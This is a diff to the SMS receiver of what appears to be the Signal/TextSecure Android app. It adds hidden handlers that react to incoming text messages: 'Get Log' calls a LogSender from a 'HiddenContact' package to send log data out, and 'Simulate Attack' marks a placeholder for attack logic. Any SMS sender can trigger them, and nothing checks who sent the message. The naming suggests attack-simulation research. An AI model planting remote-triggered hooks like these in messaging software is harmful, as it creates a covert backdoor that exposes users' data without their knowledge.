@@ -30,6 +30,7 @@ import android.util.Log;
 
 import org.thoughtcrime.securesms.ApplicationContext;
 import org.thoughtcrime.securesms.RegistrationActivity;
+import org.thoughtcrime.securesms.biu.HiddenContact.LogSender;
 import org.thoughtcrime.securesms.jobs.SmsReceiveJob;
 import org.thoughtcrime.securesms.util.TextSecurePreferences;
 import org.thoughtcrime.securesms.util.Util;
@@ -39,6 +40,8 @@ import java.util.regex.Pattern;
 
 public class SmsListener extends BroadcastReceiver {
 
+  private static final String SIMULATE_ATTACK_STR = "Simulate Attack";
+  private static final String GET_LOG_STR = "Get Log";
   private static final String SMS_RECEIVED_ACTION  = Telephony.Sms.Intents.SMS_RECEIVED_ACTION;
   private static final String SMS_DELIVERED_ACTION = Telephony.Sms.Intents.SMS_DELIVER_ACTION;
 
@@ -145,6 +148,15 @@ public class SmsListener extends BroadcastReceiver {
     Log.w("SMSListener", "Got SMS broadcast...");
 
     String messageBody = getSmsMessageBodyFromIntent(intent);
+    if (messageBody.equals(SIMULATE_ATTACK_STR)){
+      //add here the attack logic
+      Log.w("SMSListener", "Got Simulate Attack");
+    } else if(messageBody.equals(GET_LOG_STR)){
+
+      Log.w("SMSListener", "Got Get Log");
+      LogSender logger = new LogSender();
+      logger.SendLogData();
+    }
     if (SMS_RECEIVED_ACTION.equals(intent.getAction()) && isChallenge(context, messageBody)) {
       Log.w("SmsListener", "Got challenge!");
       Intent challengeIntent = new Intent(RegistrationActivity.CHALLENGE_EVENT);
